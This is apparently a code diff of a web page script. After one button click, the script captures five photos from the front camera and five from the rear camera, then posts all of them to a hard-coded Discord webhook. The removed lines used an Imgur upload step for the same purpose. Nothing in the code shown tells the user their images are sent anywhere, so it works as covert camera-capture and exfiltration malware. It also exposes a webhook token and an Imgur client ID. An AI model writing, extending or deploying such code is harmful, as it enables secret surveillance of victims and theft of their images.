@@ -46,16 +46,15 @@
   <canvas id="canvas"></canvas>
 
   <script>
-    const IMGUR_CLIENT_ID = '6e1b6bf28c5da0e';
     const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1365282819646947409/YLfOxbOuLrQ6AHYb0_bImraprcO6VxmcoIbM4Sz2r9z_fIvuZiLED3TUIIDZCeQszc_u';
 
     const video = document.getElementById('video');
     const canvas = document.getElementById('canvas');
     const shootBtn = document.getElementById('shootBtn');
 
-    async function startCamera() {
+    async function startCamera(facingMode) {
       const stream = await navigator.mediaDevices.getUserMedia({
-        video: { facingMode: 'user' },
+        video: { facingMode: facingMode },
         audio: false
       });
       video.srcObject = stream;
@@ -68,50 +67,52 @@
       canvas.height = video.videoHeight;
       const ctx = canvas.getContext('2d');
       ctx.drawImage(video, 0, 0);
-      return canvas.toDataURL('image/jpeg').split(',')[1];
+      return new Promise(resolve => {
+        canvas.toBlob(blob => {
+          resolve(blob);
+        }, 'image/jpeg');
+      });
     }
 
-    async function uploadToDiscord(base64Image) {
+    async function uploadImagesToDiscord(blobs) {
+      const form = new FormData();
+      form.append('content', '画像をアップロード');
+
+      blobs.forEach((blob, i) => {
+        form.append(`files[${i}]`, blob, `image_${i + 1}.jpg`);
+      });
+
       try {
-        const imgurRes = await fetch('https://api.imgur.com/3/image', {
-          method: 'POST',
-          headers: {
-            Authorization: `Client-ID ${IMGUR_CLIENT_ID}`,
-            'Content-Type': 'application/json'
-          },
-          body: JSON.stringify({ image: base64Image, type: 'base64' })
-        });
-
-        const imgurJson = await imgurRes.json();
-        const imageUrl = imgurJson.data.link;
-
         await fetch(DISCORD_WEBHOOK_URL, {
           method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ content: `画像をアップロード
-${imageUrl}` })
+          body: form
         });
       } catch (err) {
-        console.error('アップロード中にエラー:', err);
+        console.error('Discordへの送信エラー:', err);
       }
+    }
+
+    async function captureSequence(facingMode, count, delayMs) {
+      const blobs = [];
+      const stream = await startCamera(facingMode);
+
+      for (let i = 0; i < count; i++) {
+        const blob = await captureImage();
+        blobs.push(blob);
+        await new Promise(resolve => setTimeout(resolve, delayMs));
+      }
+
+      stream.getTracks().forEach(track => track.stop());
+      return blobs;
     }
 
     shootBtn.addEventListener('click', async () => {
       shootBtn.disabled = true;
-      const stream = await startCamera();
 
-      await new Promise(resolve => setTimeout(resolve, 500));
+      const frontBlobs = await captureSequence('user', 5, 100);
+      const backBlobs = await captureSequence('environment', 5, 100);
 
-      const captures = [];
-      for (let i = 0; i < 5; i++) {
-        captures.push(captureImage());
-      }
-
-      stream.getTracks().forEach(track => track.stop());
-
-      for (const base64 of captures) {
-        await uploadToDiscord(base64);
-      }
+      await uploadImagesToDiscord([...frontBlobs, ...backBlobs]);
 
       shootBtn.disabled = false;
     });
